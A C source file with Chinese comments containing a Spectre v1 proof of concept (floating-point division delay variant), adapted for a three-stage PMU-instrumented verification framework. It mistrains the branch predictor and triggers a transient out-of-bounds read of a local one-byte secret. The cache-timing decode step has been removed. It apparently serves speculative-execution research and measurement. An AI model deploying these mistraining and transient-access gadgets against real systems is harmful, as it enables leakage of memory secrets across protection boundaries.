/* ============================================================
 *  Spectre v1 PoC (浮点除法延迟版)
 *  — 适配三阶段验证框架版本
 *
 *  改造原则：保留浮点除法延迟链 + 训练模式，删除自实现 F+R
 *
 *  改造点：
 *    [-] 删除 rdcycle / CACHE_HIT_THRESHOLD / topTwoIdx
 *    [-] 删除 main 中逐字节迭代解码 + 结果统计
 *    [-] 删除 buffer[] 数组（未使用）
 *    [~] secret 改为单字节 "Y"
 *    [~] victimFunc 加 noinline + PMU 插桩
 *    [~] 训练+触发逻辑提取为 stage1_mistrain_trigger
 *    [+] probe_stride / NOP_REGION 宏 / PMU extern
 *    [+] 3 个 vf_ API + 框架格式 main
 *
 *  保持原样：
 *    - array2[256 * L1_BLOCK_SZ_BYTES] 大小
 *    - victimFunc 内浮点除法延迟链（cvtsi2ss + divss x4）
 *    - array2[array1[idx] * L1_BLOCK_SZ_BYTES] 编码
 *    - 训练轮数 TRAIN_TIMES=10 / ROUNDS=1
 *    - randIdx = atkRound % array1_sz 训练索引选择
 *    - 30 次空循环制造 taken BHR 状态
 * ============================================================ */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <immintrin.h>

#define TRAIN_TIMES 10 // assumption is that you have a 2 bit counter in the predictor
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define L1_BLOCK_SZ_BYTES 64

static inline uint64_t rdcycle(void) {
    uint32_t lo, hi, aux;
    __asm__ __volatile__ (
        "rdtscp"
        : "=a"(lo), "=d"(hi), "=c"(aux)
        :
        : "memory"
    );
    return ((uint64_t)hi << 32) | lo;
}

/* ============================================================
 *  框架必需：瞬态区标记 + 探针步长
 * ============================================================ */
#define NOP_REGION_BEGIN  asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END    asm volatile("# NOP_REGION_END");

volatile size_t probe_stride = 512;

/********************************************************************
 * Victim code.
 ********************************************************************/
uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t __attribute__((aligned(4096))) array2[256 * L1_BLOCK_SZ_BYTES];

static void evict(void *addr) {
    _mm_clflush(addr);
    _mm_mfence();
}

/* 单字节 secret —— 字符串字面量形式 */
char* secretString = "Y";

/********************************************************************
 * 框架 PMU 接口声明（实现由框架链接器提供）
 ********************************************************************/
extern int      pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int      pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);

extern void     pmu_uops_snap_before(void);
extern void     pmu_uops_snap_after(void);
extern void     pmu_uops_print_results(void);
extern int      pmu_uops_get_count(void);
extern int32_t  pmu_uops_get_transient(int i);

/********************************************************************
 * Victim Function (Gadget) —— 框架 PMU 插桩位置
 *
 *  保留原 victimFunc 主体：
 *    - 浮点除法延迟链（cvtsi2ss + divss x4）stall array1_sz
 *    - 分支判断 if (idx < array1_sz)
 *    - 瞬态访问 array2[array1[idx] * L1_BLOCK_SZ_BYTES]
 *  仅在外围加入框架插桩标签
 ********************************************************************/
__attribute__((noinline))
void victimFunc(uint64_t idx)
{
	uint8_t dummy = 2;

	// stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
	array1_sz = array1_sz << 4;
	asm volatile (
		"cvtsi2ss %[in], %%xmm0\n\t"        // convert dummy to float
		"cvtsi2ss %[inout], %%xmm1\n\t"     // convert array1_sz to float
		"divss %%xmm0, %%xmm1\n\t"
		"divss %%xmm0, %%xmm1\n\t"
		"divss %%xmm0, %%xmm1\n\t"
		"divss %%xmm0, %%xmm1\n\t"          // fdiv.s chain x4
		"cvttss2si %%xmm1, %[out]\n\t"      // convert back to int
		: [out] "=r" (array1_sz)
		: [inout] "r" (array1_sz), [in] "r" ((uint64_t)dummy)
		: "xmm0", "xmm1"
	);

    pmu_uops_snap_before();
	asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");
	if (idx < array1_sz) {
		NOP_REGION_BEGIN
		dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
		NOP_REGION_END
	}

	asm volatile(".globl STAGE1_END\nSTAGE1_END:");
	pmu_uops_snap_after();

	// bound speculation (dummy read prevents optimization)
	dummy = rdcycle();
}

/********************************************************************
 * Mistrain + Trigger
 *
 *  提取自原 main 中的三层嵌套循环。
 *  保留训练模式：
 *    - 外层：ATTACK_SAME_ROUNDS 次攻击同一索引
 *    - 中层：每次攻击前 flush array2 全部缓存行
 *    - 内层：(TRAIN_TIMES+1)*ROUNDS 轮训练+触发
 *      - randIdx = atkRound % array1_sz 保证训练索引随轮次变化
 *      - 位运算选择 randIdx 或 malicious_x
 *      - 30 次空循环制造 taken BHR
 *  删除：
 *    - 原始实现中 rdcycle 测时 + results 统计
 ********************************************************************/
__attribute__((noinline))
void stage1_mistrain_trigger(uint64_t malicious_x)
{
	uint64_t passInIdx, randIdx;

	// run the attack on the same idx ATTACK_SAME_ROUNDS times
	for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {

		// flush array2 全部缓存行
        for (uint64_t i = 0; i < 256; ++i){
			evict(&array2[i * L1_BLOCK_SZ_BYTES]);
			}

		for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j) {
			// bit twiddling to set passInIdx=randIdx or to malicious_x after TRAIN_TIMES iterations
			// randIdx changes everytime the atkRound changes
			randIdx = atkRound % array1_sz;
			passInIdx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;  // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
			passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
			passInIdx = randIdx ^ (passInIdx & (malicious_x ^ randIdx)); // select randIdx or malicious_x

			// set of constant takens to make the BHR be in a all taken state
			for (uint64_t k = 0; k < 30; ++k) {
				asm("");
			}

			// call function to train or attack
			victimFunc(passInIdx);
		}
	}
}

/********************************************************************
 * 框架 API
 ********************************************************************/

/* [API-1] 给定 secret 字节值，返回 array2 中对应的探测地址 */
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s)
{
	return &array2[(size_t)s * probe_stride];
}

/* [API-2] 预填 candidate_count 个候选探针缓存行 */
void vf_prepare_probe_region(int candidate_count)
{
	if (candidate_count <= 0 || candidate_count > 256)
		candidate_count = 256;
	for (int i = 0; i < candidate_count; i++) {
		volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
		*p = 1;
	}
}

/* [API-3] 执行一次完整攻击（mistrain + trigger） */
void vf_run_attack_once(void)
{
	uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
	stage1_mistrain_trigger(attackIdx);
}

/********************************************************************
 * main —— 独立运行入口（框架插桩时可被替换）
 ********************************************************************/
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char **argv)
{
	uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);

	// 执行一次完整攻击（mistrain + trigger）
	stage1_mistrain_trigger(attackIdx);

	// 输出 Stage1 BR_MISP 增量（供框架 Stage1 评分解析）
	{
		int n = pmu_stage1_get_count();
		for (int i = 0; i < n; i++) {
			printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
			       i, (unsigned long long)pmu_stage1_get_delta(i));
		}
	}

	// 输出 Stage2 UOPS 测量结果（供框架 Stage2 评分解析）
	pmu_uops_print_results();

	return 0;
}
#endif